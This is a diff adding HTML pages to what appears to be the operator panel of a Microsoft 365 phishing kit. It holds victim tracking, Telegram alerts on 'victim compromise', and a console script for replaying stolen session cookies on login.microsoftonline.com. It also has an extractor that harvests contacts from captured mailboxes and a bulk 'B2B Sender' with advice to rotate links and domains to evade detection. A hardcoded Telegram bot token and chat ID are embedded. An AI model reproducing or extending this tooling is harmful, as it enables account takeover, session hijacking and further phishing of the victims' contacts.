+                </div>
+            </div>
+        </div>
+
+        <!-- ═══════════════ OPERATORS MANAGEMENT PAGE ═══════════════ -->
+        <div id="page-operators" class="page">
+            <div class="page-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
+                <div>
+                    <h1 style="display:flex; align-items:center; gap:10px; margin:0;">
+                        <span>👥</span> Operator Management &amp; Access Delegation
+                    </h1>
+                    <div style="font-size:12px; color:#a49498; margin-top:4px;">
+                        Manage scoped operator accounts. Operators can ONLY access the Mailbox view and explore accounts explicitly delegated to them.
+                    </div>
+                </div>
+                <button class="btn btn-primary" onclick="openNewOperatorModal()" style="display:flex; align-items:center; gap:6px;">
+                    <span>➕</span> Create Operator
+                </button>
+            </div>
+
+            <div class="page-body" style="display:flex; flex-direction:column; gap:20px;">
+                <!-- KPI Stat Cards Row -->
+                <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:16px;">
+                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(88,166,255,0.12); color:#58a6ff; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(88,166,255,0.3);">👥</div>
+                        <div>
+                            <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">TOTAL OPERATORS</div>
+                            <div id="op-kpi-total" style="font-size:22px; font-weight:800; color:#f0ebed; margin-top:2px;">0</div>
+                        </div>
+                    </div>
+                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(63,185,80,0.12); color:#3fb950; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(63,185,80,0.3);">🟢</div>
+                        <div>
+                            <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">ACTIVE OPERATORS</div>
+                            <div id="op-kpi-active" style="font-size:22px; font-weight:800; color:#3fb950; margin-top:2px;">0</div>
+                        </div>
+                    </div>
+                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(229,9,20,0.12); color:#e50914; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(229,9,20,0.3);">📧</div>
+                        <div>
+                            <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">DELEGATED INBOXES</div>
+                            <div id="op-kpi-delegations" style="font-size:22px; font-weight:800; color:#f0ebed; margin-top:2px;">0</div>
+                        </div>
+                    </div>
+                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
+                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(255,159,67,0.12); color:#ff9f43; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(255,159,67,0.3);">⏸️</div>
+                        <div>
+                            <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">SUSPENDED</div>
+                            <div id="op-kpi-suspended" style="font-size:22px; font-weight:800; color:#ff9f43; margin-top:2px;">0</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Main Operators Table Card -->
+                <div class="card">
+                    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; margin-bottom:16px;">
+                        <div style="display:flex; align-items:center; gap:8px;">
+                            <input type="text" id="op-search-filter" class="lg-input" placeholder="🔍 Search by operator name or victim..." style="width:260px; font-size:12px; padding:6px 12px;" oninput="filterOperatorsList()">
+                        </div>
+                        <div style="display:flex; align-items:center; gap:8px;">
+                            <button type="button" class="btn btn-secondary btn-sm" onclick="loadOperators()" style="display:flex; align-items:center; gap:6px;">
+                                <span>🔄</span> Refresh Table
+                            </button>
+                        </div>
+                    </div>
+                    <div id="operators-page-table-container" style="overflow-x:auto;">
+                        <div style="padding:24px; text-align:center; color:#a49498;">Loading operators...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ═══════════════ SETTINGS PAGE ═══════════════ -->
+        <div id="page-settings" class="page" style="height: 100%; overflow: hidden; width: 100%;">
+            <div class="page-body" style="flex: 1; padding: 32px 48px; width: 100%; box-sizing: border-box; overflow-y: auto;">
+                <!-- Category Tag -->
+                <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.12em; color: #8e7d82; text-transform: uppercase; margin-bottom: 6px;">
+                    SETTINGS
+                </div>
+
+                <!-- Page Title -->
+                <div style="font-size: 1.55rem; font-weight: 800; color: #ffffff; letter-spacing: -0.01em; margin-bottom: 4px;">
+                    Account security controls
+                </div>
+
+                <!-- Subtitle -->
+                <div style="font-size: 0.88rem; color: #a49498; margin-bottom: 24px;">
+                    Switch between your account credentials and Telegram-based alerts.
+                </div>
+
+                <!-- Segmented Horizontal Tab Navigation Bar (100% Full Width) -->
+                <div style="background: rgba(18, 9, 13, 0.75); border: 1px solid #281014; border-radius: 10px; padding: 6px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 32px; width: 100%; box-sizing: border-box;">
+                    <button type="button" id="settings-tab-btn-account" onclick="window.switchSettingsTab('account')" style="background: #2a0f14; border: 1px solid #e50914; color: #ffffff; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
+                        Account
+                    </button>
+                    <button type="button" id="settings-tab-btn-2fa" onclick="window.switchSettingsTab('2fa')" style="background: transparent; border: 1px solid transparent; color: #a49498; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
+                        2FA
+                    </button>
+                    <button type="button" id="settings-tab-btn-telegram" onclick="window.switchSettingsTab('telegram')" style="background: transparent; border: 1px solid transparent; color: #a49498; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
+                        Telegram
+                    </button>
+                </div>
+
+                <!-- TAB 1: Account (100% Full Width) -->
+                <div id="settings-pane-account" style="display: block; width: 100%; box-sizing: border-box;">
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 48px; width: 100%; box-sizing: border-box; align-items: start;">
+                        <!-- Left Column: Current account details -->
+                        <div>
+                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: #8e7d82; text-transform: uppercase; margin-bottom: 4px;">
+                                ACCOUNT
+                            </div>
+                            <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 18px;">
+                                Current account details
+                            </div>
+
+                            <!-- Card 1: USERNAME -->
+                            <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 16px 20px; margin-bottom: 16px; width: 100%; box-sizing: border-box;">
+                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                    USERNAME
+                                </div>
+                                <div id="settings-current-username" style="font-size: 14.5px; font-weight: 700; color: #f0ebed; margin-top: 6px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+                                    admin
+                                </div>
+                            </div>
+
+                            <!-- Card 2: PASSWORD -->
+                            <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 16px 20px; width: 100%; box-sizing: border-box;">
+                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                    PASSWORD
+                                </div>
+                                <div style="font-size: 16px; letter-spacing: 0.15em; color: #f0ebed; margin-top: 6px;">
+                                    ••••••••••••
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Right Column: Change your password -->
+                        <div>
+                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: #8e7d82; text-transform: uppercase; margin-bottom: 4px;">
+                                PASSWORD CHANGE
+                            </div>
+                            <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 18px;">
+                                Change your password
+                            </div>
+
+                            <form onsubmit="handleAdminPasswordChange(event)" style="display: flex; flex-direction: column; gap: 16px; width: 100%; box-sizing: border-box;">
+                                <div style="display: flex; flex-direction: column; gap: 6px;">
+                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                        NEW PASSWORD
+                                    </label>
+                                    <input type="password" id="settings-new-admin-password" placeholder="Enter your new password" required style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 13px 18px; color: #ffffff; font-size: 14px; width: 100%; box-sizing: border-box; outline: none;">
+                                </div>
+
+                                <div style="display: flex; justify-content: flex-start; margin-top: 6px;">
+                                    <button type="submit" id="btn-save-admin-password" style="background: linear-gradient(135deg, #e50914, #b00710); color: #ffffff; border: none; padding: 12px 30px; border-radius: 8px; font-size: 12px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 14px rgba(229, 9, 20, 0.35);">
+                                        SAVE NEW PASSWORD
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB 2: 2FA (Fully Interactive & Clickable) -->
+                <div id="settings-pane-2fa" style="display: none; width: 100%; box-sizing: border-box;">
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 48px; width: 100%; box-sizing: border-box; align-items: start;">
+                        <!-- Left Column: 2FA Status -->
+                        <div>
+                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: #8e7d82; text-transform: uppercase; margin-bottom: 4px;">
+                                2FA SECURITY
+                            </div>
+                            <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 18px;">
+                                Two-Factor Authentication Status
+                            </div>
+
+                            <!-- Card 1: 2FA STATUS -->
+                            <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 18px 22px; margin-bottom: 16px; width: 100%; box-sizing: border-box;">
+                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                    2FA ENFORCEMENT POLICY
+                                </div>
+                                <div style="margin-top: 10px;">
+                                    <select id="setting-2fa-enforcement" class="dm-select" style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 10px 14px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; cursor: pointer;">
+                                        <option value="disabled">⚪ Inactive / Optional (Default)</option>
+                                        <option value="enabled">🟢 Active / Enforced for All Accounts</option>
+                                    </select>
+                                </div>
+                            </div>
+
+                            <!-- Card 2: OPERATOR POLICY -->
+                            <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 18px 22px; width: 100%; box-sizing: border-box;">
+                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                    OPERATOR ACCESS METHOD
+                                </div>
+                                <div style="font-size: 14.5px; font-weight: 600; color: #f0ebed; margin-top: 8px;">
+                                    Standard Key &amp; Token Authentication
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Right Column: 2FA Setup -->
+                        <div>
+                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: #8e7d82; text-transform: uppercase; margin-bottom: 4px;">
+                                2FA CONFIGURATION
+                            </div>
+                            <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 18px;">
+                                Configure 2FA controls
+                            </div>
+
+                            <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 22px; display: flex; flex-direction: column; gap: 16px; width: 100%; box-sizing: border-box;">
+                                <div style="display: flex; flex-direction: column; gap: 6px;">
+                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                        AUTHENTICATION METHOD
+                                    </label>
+                                    <select id="setting-2fa-method" class="dm-select" style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; cursor: pointer;">
+                                        <option value="telegram">✈️ Telegram Bot Push Verification (Recommended)</option>
+                                        <option value="totp">📱 Authenticator App (Google / Microsoft Authenticator TOTP)</option>
+                                    </select>
+                                </div>
+
+                                <div style="display: flex; flex-direction: column; gap: 6px;">
+                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                        BACKUP VERIFICATION CODE / ACCESS PIN
+                                    </label>
+                                    <input type="text" id="setting-2fa-pin" placeholder="Enter optional backup PIN" style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; outline: none;">
+                                </div>
+
+                                <div style="font-size: 0.8rem; color: #a49498; background: #0c0709; border: 1px solid #240d11; border-radius: 8px; padding: 14px 16px; line-height: 1.5;">
+                                    💡 <strong>2FA Configuration:</strong> Choose your preferred verification method and click Save to apply preferences.
+                                </div>
+
+                                <div style="display: flex; justify-content: flex-start; margin-top: 4px;">
+                                    <button type="button" onclick="save2FAPreferences()" style="background: linear-gradient(135deg, #e50914, #b00710); color: #ffffff; border: none; padding: 12px 28px; border-radius: 8px; font-size: 12px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 14px rgba(229, 9, 20, 0.35);">
+                                        💾 SAVE 2FA PREFERENCES
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB 3: Telegram (100% Full Width) -->
+                <div id="settings-pane-telegram" style="display: none; width: 100%; box-sizing: border-box;">
+                    <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: #8e7d82; text-transform: uppercase; margin-bottom: 4px;">
+                        TELEGRAM BOT
+                    </div>
+                    <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 18px;">
+                        Alert &amp; notification integration
+                    </div>
+
+                    <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 28px; display: flex; flex-direction: column; gap: 20px; width: 100%; box-sizing: border-box;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
+                            <span style="font-weight: 700; font-size: 1rem; color: #ffffff; display: flex; align-items: center; gap: 8px;">
+                                <span>✈️</span> Telegram Bot Configuration
+                            </span>
+                            <button type="button" class="btn btn-secondary btn-sm" onclick="testTelegramAlert()" style="display: inline-flex; align-items: center; gap: 6px; padding: 8px 16px; font-size: 12px; border-radius: 6px;">
+                                <span>🧪</span> Test Telegram Alert
+                            </button>
+                        </div>
+
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; width: 100%; box-sizing: border-box;">
+                            <div style="display: flex; flex-direction: column; gap: 6px;">
+                                <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                    TELEGRAM BOT TOKEN
+                                </label>
+                                <input type="password" id="setting-tg-bot-token" class="dm-input" value="8969682315:AAFcX748SNUsjXYj9OFM_g3zZJJ2w4Ljc7c" placeholder="e.g. 7123456789:AAHkXYZ..." style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
+                            </div>
+                            <div style="display: flex; flex-direction: column; gap: 6px;">
+                                <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                    TELEGRAM CHAT ID
+                                </label>
+                                <input type="text" id="setting-tg-chat-id" class="dm-input" value="7922291087" placeholder="e.g. 123456789" style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
+                            </div>
+                        </div>
+
+                        <div style="display: flex; gap: 20px; align-items: center; flex-wrap: wrap; padding-top: 6px;">
+                            <label style="display: flex; align-items: center; gap: 9px; cursor: pointer; font-size: 0.88rem; color: #f0ebed;">
+                                <input type="checkbox" id="setting-notify-token" checked style="accent-color: #e50914; width: 17px; height: 17px;">
+                                <span>Notify on Victim Compromise (Dispatched once entire device &amp; session flow completes)</span>
+                            </label>
+                        </div>
+
+                        <div style="font-size: 0.8rem; color: #a49498; line-height: 1.6; background: #0c0709; border: 1px solid #240d11; border-radius: 8px; padding: 14px 16px;">
+                            💡 <strong style="color: #f0ebed;">Quick Setup Guide:</strong><br>
+                            1. Open Telegram and search <b>@BotFather</b>. Send <code>/newbot</code>, follow the prompts, and copy the <b>Bot Token</b>.<br>
+                            2. Open your new bot and tap <b>Start</b> (or send <code>/start</code>).<br>
+                            3. Message <b>@userinfobot</b> on Telegram to copy your numerical <b>Chat ID</b>.<br>
+                            4. Paste both into the fields above and click <b>Test Telegram Alert</b>.
+                        </div>
+
+                        <div style="display: flex; justify-content: flex-end; padding-top: 6px;">
+                            <button type="button" class="btn btn-primary" onclick="saveTelegramSettings()" style="background: linear-gradient(135deg, #e50914, #b00710); padding: 11px 26px; font-weight: 700; font-size: 13px; border-radius: 8px;">
+                                💾 Save Telegram Settings
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Inline Standalone Controller to Guarantee Instant Clickability & Scope -->
+            <script>
+            (function() {
+                window.switchSettingsTab = function(tab) {
+                    const tabs = ['account', '2fa', 'telegram'];
+                    tabs.forEach(function(t) {
+                        const pane = document.getElementById('settings-pane-' + t);
+                        const btn = document.getElementById('settings-tab-btn-' + t);
+                        const isActive = (t === tab);
+                        if (pane) pane.style.display = isActive ? 'block' : 'none';
+                        if (btn) {
+                            btn.style.background = isActive ? '#2a0f14' : 'transparent';
+                            btn.style.borderColor = isActive ? '#e50914' : 'transparent';
+                            btn.style.color = isActive ? '#ffffff' : '#a49498';
+                            btn.style.fontWeight = isActive ? '700' : '600';
+                        }
+                    });
+                };
+
+                // Attach direct click listeners once loaded
+                function bindSettingsTabEvents() {
+                    ['account', '2fa', 'telegram'].forEach(function(t) {
+                        const btn = document.getElementById('settings-tab-btn-' + t);
+                        if (btn) {
+                            btn.addEventListener('click', function(e) {
+                                e.preventDefault();
+                                window.switchSettingsTab(t);
+                            });
+                        }
+                    });
+                }
+
+                if (document.readyState === 'loading') {
+                    document.addEventListener('DOMContentLoaded', bindSettingsTabEvents);
+                } else {
+                    bindSettingsTabEvents();
+                }
+            })();
+            </script>
+        </div>
+
+
+        <!-- ═══════════════ EXTRACTOR & SORTER PAGE ═══════════════ -->
+        <div id="page-extractor" class="page" style="padding:0; overflow:hidden;">
+            <div class="extractor-viewport">
+
+                <!-- Top Bar -->
+                <div class="extractor-top-bar">
+                    <div class="extractor-title">
+                        <span>⚗️</span> EXTRACTOR &amp; SORTER
+                    </div>
+                    <div class="extractor-tabs">
+                        <div class="extractor-tab active" id="etab-extractor" onclick="switchExtractorTab('extractor')">📤 Extractor</div>
+                        <div class="extractor-tab" id="etab-sorter" onclick="switchExtractorTab('sorter')">🗂️ Sorter</div>
+                    </div>
+                    <select id="extractor-account-select" class="account-selector-pill" onchange="onExtractorAccountChange()">
+                        <option value="">— Select captured account —</option>
+                    </select>
+                </div>
+
+                <div class="extractor-body">
+
+                    <!-- ── EXTRACTOR PANEL ── -->
+                    <div id="epanel-extractor" class="extractor-panel active">
+
+                        <!-- Category Cards -->
+                        <div class="extractor-controls-row" id="extractor-category-row">
+                            <div class="category-card selected" id="cat-mail" onclick="toggleCategory('mail')">
+                                <div class="category-checkbox" id="chk-mail"></div>
+                                <div>
+                                    <div class="category-info-title">✉️ Mail Messages</div>
+                                    <div class="category-info-desc">Extracts all email addresses found in From, Reply-To, To, CC and BCC fields across every mail folder in the mailbox.</div>
+                                </div>
+                            </div>
+                            <div class="category-card selected" id="cat-contacts" onclick="toggleCategory('contacts')">
+                                <div class="category-checkbox" id="chk-contacts"></div>
+                                <div>
+                                    <div class="category-info-title">👤 Contacts</div>
+                                    <div class="category-info-desc">Extracts all contacts from the default contacts folder and every sub-folder, including name and email address.</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Action buttons + counters -->
+                        <div class="extractor-btn-group">
+                            <button class="ext-btn ext-btn-start" id="ext-start-btn" onclick="startExtraction()" disabled>
+                                <span>▶</span> Start Extraction
+                            </button>
+                            <button class="ext-btn ext-btn-download" id="ext-dl-txt-btn" onclick="downloadExtracted('txt')" disabled>
+                                ⬇ Download TXT
+                            </button>
+                            <button class="ext-btn ext-btn-download" id="ext-dl-csv-btn" onclick="downloadExtracted('csv')" disabled>
+                                ⬇ Download CSV
+                            </button>
+                            <button class="ext-btn ext-btn-reset" onclick="resetExtractor()">
+                                ↺ Reset
+                            </button>
+                            <div class="ext-counters">
+                                <div class="ext-counter-chip">mail <span id="ctr-mail">0</span></div>
+                                <div class="ext-counter-chip">emails <span id="ctr-emails">0</span></div>
+                                <div class="ext-counter-chip">scanned <span id="ctr-scanned">0</span></div>
+                            </div>
+                        </div>
+
+                        <!-- Progress bar -->
+                        <div class="progress-bar-outer" id="ext-progress-bar-outer" style="display:none;">
+                            <div class="progress-bar-inner" id="ext-progress-bar" style="width:0%"></div>
+                        </div>
+
+                        <!-- Terminal Output -->
+                        <div class="terminal-pane" id="ext-terminal">
+                            <div class="terminal-line dim"><span class="term-ts">[00:00]</span><span class="term-txt">Select an account and categories above, then click ▶ Start Extraction.</span></div>
+                        </div>
+                    </div>
+
+                    <!-- ── SORTER PANEL ── -->
+                    <div id="epanel-sorter" class="extractor-panel">
+
+                        <!-- Upload Zone -->
+                        <div class="sorter-upload-zone" id="sorter-drop-zone"
+                            onclick="document.getElementById('sorter-file-input').click()"
+                            ondragover="event.preventDefault(); this.classList.add('drag-over')"
+                            ondragleave="this.classList.remove('drag-over')"
+                            ondrop="handleSorterDrop(event)">
+                            <input type="file" id="sorter-file-input" accept=".txt,.csv" onchange="handleSorterFileSelect(event)">
+                            <div class="sorter-upload-icon">📂</div>
+                            <div class="sorter-upload-label">Drop a <strong>.txt</strong> or <strong>.csv</strong> file here, or click to browse</div>
+                            <div id="sorter-file-name" style="margin-top:10px; font-size:0.8em; color:#58a6ff; font-weight:600;"></div>
+                        </div>
+
+                        <!-- Action buttons -->
+                        <div class="extractor-btn-group">
+                            <button class="ext-btn ext-btn-start" id="sort-start-btn" onclick="startSorting()" disabled>
+                                <span>▶</span> Start Sorting
+                            </button>
+                            <button class="ext-btn ext-btn-download" id="sort-dl-txt-btn" onclick="downloadSorted('txt')" disabled>
+                                ⬇ Download TXT
+                            </button>
+                            <button class="ext-btn ext-btn-download" id="sort-dl-csv-btn" onclick="downloadSorted('csv')" disabled>
+                                ⬇ Download CSV
+                            </button>
+                            <button class="ext-btn ext-btn-download" id="sort-dl-zip-btn" onclick="downloadSorted('zip')" disabled style="background: linear-gradient(135deg, #107c41, #0b5a2f); border-color: #27ae60; color: #fff;">
+                                📦 Download ZIP (Per Domain)
+                            </button>
+                            <button class="ext-btn ext-btn-reset" onclick="resetSorter()">
+                                ↺ Reset
+                            </button>
+                            <div class="ext-counters">
+                                <div class="ext-counter-chip">total <span id="sort-ctr-total">0</span></div>
+                                <div class="ext-counter-chip">domains <span id="sort-ctr-domains">0</span></div>
+                            </div>
+                        </div>
+
+                        <!-- Terminal Output -->
+                        <div class="terminal-pane" id="sort-terminal">
+                            <div class="terminal-line dim"><span class="term-ts">[00:00]</span><span class="term-txt">Upload a TXT or CSV file containing email addresses, then click ▶ Start Sorting.</span></div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Cookie Modal (Phase 2) -->
+    <div id="cookieModal" class="modal-overlay">
+        <div class="modal" style="max-width: 650px;">
+            <div class="modal-header">
+                <h2 style="display:flex; align-items:center; gap:8px;">🍪 Cookie</h2>
+                <button class="close-btn" onclick="closeCookieModal()">&times;</button>
+            </div>
+            <p style="font-size: 0.9em; color: var(--text-secondary); margin-bottom: 12px; line-height: 1.5;">
+                Paste this snippet directly into your browser's DevTools Console (F12) while on <b>login.microsoftonline.com</b> to authenticate immediately using the modern JavaScript <code>cookieStore.set()</code> API.
+            </p>
+            <div class="token-group">
+                <span class="token-label">Console Script</span>
+                <textarea id="cookie-script-text" class="token-value" style="width: 100%; height: 140px; resize: none; font-family: monospace; font-size: 12px;" readonly></textarea>
+            </div>
+            <div style="display: flex; gap: 10px; justify-content: flex-end; margin-top: 15px;">
+                <button class="btn btn-secondary" onclick="downloadCookieTxt()">💾 Download as .txt</button>
+                <button class="btn btn-primary" onclick="copyCookieScript()">📋 Copy</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- App Confirm Modal (Themed In-App Confirmation Dialog) -->
+    <div id="appConfirmModal" class="modal-overlay" style="z-index: 99999;">
+        <div class="modal" style="max-width: 440px; background: #130d10; border: 1px solid #4a191f; border-radius: 14px; box-shadow: 0 20px 50px rgba(0,0,0,0.85); padding: 24px;">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:14px;">
+                <div id="appConfirmIcon" style="width:40px; height:40px; border-radius:50%; background:rgba(229,9,20,0.15); border:1px solid rgba(229,9,20,0.3); display:flex; align-items:center; justify-content:center; font-size:20px; flex-shrink:0;">🗑️</div>
+                <h3 id="appConfirmTitle" style="color:#ffffff; font-size:1.1rem; font-weight:700; margin:0; letter-spacing:0.01em;">Confirm Action</h3>
+            </div>
+            <p id="appConfirmMessage" style="color:#c5b4b8; font-size:0.88rem; line-height:1.55; margin-bottom:22px;">Are you sure you want to proceed?</p>
+            <div style="display:flex; justify-content:flex-end; gap:10px;">
+                <button type="button" class="btn btn-secondary" onclick="closeAppConfirm(false)" style="padding:8px 18px; font-size:0.84rem; background:#22171a; border-color:#3d2026; color:#e0d2d6;">Cancel</button>
+                <button type="button" id="appConfirmBtn" class="btn" onclick="closeAppConfirm(true)" style="background:#e50914; color:#ffffff; border:none; padding:8px 20px; font-size:0.84rem; font-weight:700; border-radius:6px; box-shadow:0 4px 14px rgba(229,9,20,0.4);">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- B2B Sender Page -->
+    <div id="page-b2b" class="page" style="padding:0; overflow:hidden;">
+        <div class="b2b-viewport">
+            <!-- Top Bar -->
+            <div class="b2b-top-bar">
+                <div class="b2b-brand">✉ B2B Sender</div>
+                <div class="b2b-chips">
+                    <div class="b2b-chip" onclick="loadB2BCampaigns()">📁 CAMPAIGNS <span id="b2b-campaign-count">0</span></div>
+                    <div class="b2b-chip b2b-chip-muted" onclick="cyclePriority()">PRIORITY · <span id="b2b-priority-label">NORMAL</span></div>
+                    <div class="b2b-chip b2b-chip-muted" onclick="toggleB2BDelay()">DELAY · <span id="b2b-delay-label">OFF</span></div>
+                </div>
+                <select id="b2b-account-select" class="b2b-account-select" onchange="onB2BAccountChange()">
+                    <option value="">— Select Account —</option>
+                </select>
+            </div>
+
+            <!-- Campaign Name -->
+            <div class="b2b-campaign-bar">
+                <div class="b2b-field-label">CAMPAIGN NAME</div>
+                <input type="text" id="b2b-campaign-name" class="b2b-campaign-input" placeholder="e.g. Contoso Q2 outreach">
+            </div>
+
+            <!-- Warning Ticker -->
+            <div class="b2b-ticker-wrap">
+                <span class="b2b-ticker-inner">⚠ Once 24 hours have passed after you've used a link in a campaign, make sure not to send out with that link again. Rather, generate a new link and use it to send out. Preferably, use a new domain to generate the new link, and make sure you do not delete the old campaign until 24 hours have passed. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ⚠ Once 24 hours have passed after you've used a link in a campaign, make sure not to send out with that link again. Rather, generate a new link and use it to send out.</span>
+            </div>
+
+            <!-- Main Body (3-Column Layout: Column 1 Recipients, Column 2 Parameters & Actions, Column 3 Compose Canvas touching right edge) -->
+            <div class="b2b-main-body">
+                <!-- Column 1: Recipients List (Generous Breathing Space) -->
+                <div class="b2b-col-recipients">
+                    <div class="b2b-panel-header">
+                        <span>RECIPIENTS</span>
+                        <div class="b2b-bcc-row" onclick="toggleB2BBCC()" title="BCC mode: hide recipients from each other">
+                            <span class="b2b-bcc-label">BCC</span>
+                            <div class="b2b-sw" id="b2b-bcc-sw"></div>
+                        </div>
+                    </div>
+                    <textarea id="b2b-recipients" class="b2b-rec-area" placeholder="one@email.com&#10;another@email.com" oninput="updateB2BRecipientCount()"></textarea>
+                    <div class="b2b-rec-btns">
+                        <button class="b2b-sm-btn" onclick="loadB2BRecipientsFile()">LOAD</button>
+                        <button class="b2b-sm-btn" onclick="dedupeB2BRecipients()">DEDUPE</button>
+                        <button class="b2b-sm-btn b2b-sm-btn-danger" onclick="document.getElementById('b2b-recipients').value='';updateB2BRecipientCount()">CLEAR</button>
+                    </div>
+                    <input type="file" id="b2b-recipients-file" accept=".txt,.csv" style="display:none" onchange="handleB2BRecipientsFile(event)">
+                    <div class="b2b-rec-count" id="b2b-rec-count">0 recipients</div>
+                </div>
+
+                <!-- Column 2: Campaign Parameters, Toggles, Send Action & Terminal Log -->
+                <div class="b2b-col-params">
+                    <!-- Subject Lines -->
+                    <div class="b2b-field-section">
+                        <div class="b2b-compose-label">SUBJECT LINES <span class="b2b-dim">(ROTATES)</span></div>
+                        <textarea id="b2b-subjects" class="b2b-mini-ta" rows="2" placeholder="Your Q3 Invoice — Action Required&#10;[NAME], Important update from [COMPANY]"></textarea>
+                        <div class="b2b-rotate-row">
+                            <span class="b2b-dim">Rotate after:</span>
+                            <div class="b2b-counter">
+                                <button onclick="adjustB2BCounter('b2b-subject-rotate', -1)">−</button>
+                                <input type="number" id="b2b-subject-rotate" value="1" min="1" class="b2b-counter-input">
+                                <button onclick="adjustB2BCounter('b2b-subject-rotate', 1)">+</button>
